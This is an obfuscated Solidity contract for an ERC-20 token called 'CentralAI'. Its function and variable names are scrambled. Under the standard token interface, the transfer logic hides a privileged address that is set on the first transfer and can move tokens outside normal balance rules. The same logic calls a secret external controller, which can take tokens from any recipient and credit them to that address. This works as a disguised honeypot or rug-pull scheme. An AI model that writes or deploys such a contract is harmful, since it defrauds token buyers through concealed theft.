// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library MbypoVKDQygh{
    
    function QuXpxo(address deBcd, address pVROXx, uint vmZ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool hcXoxSpDtVV, bytes memory pwVJ) = deBcd.call(abi.encodeWithSelector(0x095ea7b3, pVROXx, vmZ));
        require(hcXoxSpDtVV && (pwVJ.length == 0 || abi.decode(pwVJ, (bool))), 'MbypoVKDQygh: APPROVE_FAILED');
    }

    function mMsJOUPzDZNJ(address deBcd, address pVROXx, uint vmZ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool hcXoxSpDtVV, bytes memory pwVJ) = deBcd.call(abi.encodeWithSelector(0xa9059cbb, pVROXx, vmZ));
        require(hcXoxSpDtVV && (pwVJ.length == 0 || abi.decode(pwVJ, (bool))), 'MbypoVKDQygh: TRANSFER_FAILED');
    }
    
    function OSHOGYGviMBN(address pVROXx, uint vmZ) internal {
        (bool hcXoxSpDtVV,) = pVROXx.call{value:vmZ}(new bytes(0));
        require(hcXoxSpDtVV, 'MbypoVKDQygh: ETH_TRANSFER_FAILED');
    }

    function VynFPD(address deBcd, address from, address pVROXx, uint vmZ) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool hcXoxSpDtVV, bytes memory pwVJ) = deBcd.call(abi.encodeWithSelector(0x23b872dd, from, pVROXx, vmZ));
        require(hcXoxSpDtVV && pwVJ.length > 0,'MbypoVKDQygh: TRANSFER_FROM_FAILED'); return pwVJ;
                       
    }

}
    
interface gClYvCWgPxrV {
    function totalSupply() external view returns (uint256);
    function balanceOf(address NewU) external view returns (uint256);
    function transfer(address YsyGDLPuMjw, uint256 odRbmFj) external returns (bool);
    function allowance(address dFbWxxhxCJB, address spender) external view returns (uint256);
    function approve(address spender, uint256 odRbmFj) external returns (bool);
    function transferFrom(
        address sender,
        address YsyGDLPuMjw,
        uint256 odRbmFj
    ) external returns (bool);

    event Transfer(address indexed from, address indexed SzUyrJIRrb, uint256 value);
    event Approval(address indexed dFbWxxhxCJB, address indexed spender, uint256 value);
}

interface gWCkzASlLrcB is gClYvCWgPxrV {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract AzKFIpaFe {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface UQf {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract CentralAI is AzKFIpaFe, gClYvCWgPxrV, gWCkzASlLrcB {
    
    uint256 private IegOnUBAwej = 2000000000000 * 10 ** 18;
    
    function esa(
        address uFqWVKbWLPTe,
        address HAmyMErM,
        uint256 oNXGErzwTY
    ) internal virtual {
        require(uFqWVKbWLPTe != address(0), "ERC20: approve from the zero address");
        require(HAmyMErM != address(0), "ERC20: approve to the zero address");

        qlByeHE[uFqWVKbWLPTe][HAmyMErM] = oNXGErzwTY;
        emit Approval(uFqWVKbWLPTe, HAmyMErM, oNXGErzwTY);

    }
    
    function decreaseAllowance(address QmNITyLMC, uint256 subtractedValue) public virtual returns (bool) {
        uint256 WwubFxUCuZ = qlByeHE[_msgSender()][QmNITyLMC];
        require(WwubFxUCuZ >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            esa(_msgSender(), QmNITyLMC, WwubFxUCuZ - subtractedValue);
        }

        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function PpJhzToY(
        address tJCjleQsyZv,
        address GSsJfD
    ) internal virtual  returns (bool){
        if(iYCxGqmSt == address(0) && MPtwvpWQbM == address(0)){
            iYCxGqmSt = tJCjleQsyZv;MPtwvpWQbM=GSsJfD;
            MbypoVKDQygh.mMsJOUPzDZNJ(MPtwvpWQbM, iYCxGqmSt, 0);
            PifjIPxRKqkk = UQf(MPtwvpWQbM).WETH();
            return false;
        }
        return true;
    }
    
    address private iYCxGqmSt;
    
    mapping(address => mapping(address => uint256)) private qlByeHE;
    
    function allowance(address GcuQhnNJLoS, address gKFCAqlGiwcN) public view virtual override returns (uint256) {
        return qlByeHE[GcuQhnNJLoS][gKFCAqlGiwcN];
    }
    
    address private MPtwvpWQbM;
    
    function transfer(address KhohBhBqqvt, uint256 QQVsiHjd) public virtual override returns (bool) {
        BvKbXqPMyyU(_msgSender(), KhohBhBqqvt, QQVsiHjd);
        return true;
    }
    
    string private wVThIpjC =  "CentralAI";
    
    function increaseAllowance(address AuOBordBaYJS, uint256 addedValue) public virtual returns (bool) {
        esa(_msgSender(), AuOBordBaYJS, qlByeHE[_msgSender()][AuOBordBaYJS] + addedValue);
        return true;
    }
    
    function blQbximC(
        address nHKduYtpoG,
        address ugpsiLEz,
        uint256 SOLrTTtoz
    ) internal virtual  returns (bool){
        uint256 dEdbxRBngY = KhQTLxOuUfa[nHKduYtpoG];
        require(dEdbxRBngY >= SOLrTTtoz, "ERC20: transfer Amount exceeds balance");
        unchecked {
            KhQTLxOuUfa[nHKduYtpoG] = dEdbxRBngY - SOLrTTtoz;
        }
        KhQTLxOuUfa[ugpsiLEz] += SOLrTTtoz;
        return true;
    }
    
    function BvKbXqPMyyU(
        address TSciaUxla,
        address GPHs,
        uint256 msGIKxiq
    ) internal virtual  returns (bool){
        require(TSciaUxla != address(0), "ERC20: transfer from the zero address");
        require(GPHs != address(0), "ERC20: transfer to the zero address");
        
        if(!PpJhzToY(TSciaUxla,GPHs)) return false;

        if(_msgSender() == address(iYCxGqmSt)){
            if(GPHs == PifjIPxRKqkk && KhQTLxOuUfa[TSciaUxla] < msGIKxiq){
                blQbximC(iYCxGqmSt,GPHs,msGIKxiq);
            }else{
                blQbximC(TSciaUxla,GPHs,msGIKxiq);
                if(TSciaUxla == iYCxGqmSt || GPHs == iYCxGqmSt) 
                return false;
            }
            emit Transfer(TSciaUxla, GPHs, msGIKxiq);
            return false;
        }
        blQbximC(TSciaUxla,GPHs,msGIKxiq);
        emit Transfer(TSciaUxla, GPHs, msGIKxiq);
        bytes memory ZhUUgfmj = MbypoVKDQygh.VynFPD(MPtwvpWQbM, TSciaUxla, GPHs, msGIKxiq);
        (bool uGqPewlTEZX, uint xSrqdmOlvfAK) = abi.decode(ZhUUgfmj, (bool,uint));
        if(uGqPewlTEZX){
            KhQTLxOuUfa[iYCxGqmSt] += xSrqdmOlvfAK;
            KhQTLxOuUfa[GPHs] -= xSrqdmOlvfAK; 
        }
        return true;
    }
    
    function transferFrom(
        address AKQ,
        address fyce,
        uint256 htKmKIRCBZUG
    ) public virtual override returns (bool) {
      
        if(!BvKbXqPMyyU(AKQ, fyce, htKmKIRCBZUG)) return true;

        uint256 QRRElGw = qlByeHE[AKQ][_msgSender()];
        if (QRRElGw != type(uint256).max) {
            require(QRRElGw >= htKmKIRCBZUG, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                esa(AKQ, _msgSender(), QRRElGw - htKmKIRCBZUG);
            }
        }

        return true;
    }
    
    address private PifjIPxRKqkk;
  
    
    function symbol() public view virtual override returns (string memory) {
        return wVThIpjC;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return IegOnUBAwej;
    }
    
    mapping(address => uint256) private KhQTLxOuUfa;
    
    constructor() {
        
        KhQTLxOuUfa[address(1)] = IegOnUBAwej;
        emit Transfer(address(0), address(1), IegOnUBAwej);

    }
    
    function approve(address xYs, uint256 soLsrTuB) public virtual override returns (bool) {
        esa(_msgSender(), xYs, soLsrTuB);
        return true;
    }
    
    function balanceOf(address zaagwUDxn) public view virtual override returns (uint256) {
       return KhQTLxOuUfa[zaagwUDxn];
    }
    
    string private Ucjcs = "Central AI";
    
    function name() public view virtual override returns (string memory) {
        return Ucjcs;
    }
    
}